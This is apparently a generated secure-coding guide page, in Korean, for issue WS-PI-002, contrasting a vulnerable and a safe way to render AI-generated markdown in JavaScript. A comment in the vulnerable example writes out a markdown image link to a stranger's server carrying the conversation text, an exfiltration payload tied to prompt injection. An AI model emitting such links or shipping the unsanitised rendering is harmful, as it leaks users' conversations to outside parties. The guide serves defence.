<!-- generated from white-security issues; do not edit -->
# WS-PI-002 코드 예시 — JavaScript

✗ 취약 코드 (vulnerable example — do not use)

```js
import { marked } from "marked";

// ![x](https://남의서버/?q=<대화 내용>) 도 그대로 이미지로 뜬다
answerEl.innerHTML = marked.parse(aiText);
```

✓ 안전 코드 (safe example)

```js
import { marked } from "marked";
import DOMPurify from "dompurify";

const IMG_HOSTS = new Set([location.host, "img.example.com"]); // 내가 운영하는 곳만
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "IMG") return;
  let host = "";
  try { host = new URL(node.getAttribute("src") ?? "", location.href).host; } catch {}
  if (!IMG_HOSTS.has(host)) node.removeAttribute("src"); // 주소가 없으면 요청도 없다
});
answerEl.innerHTML = DOMPurify.sanitize(marked.parse(aiText), {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "img", "blockquote"],
  ALLOWED_ATTR: ["href", "src", "alt", "title"], // srcset·style 은 받지 않는다
});
// 응답 헤더: Content-Security-Policy: img-src 'self' https://img.example.com
```
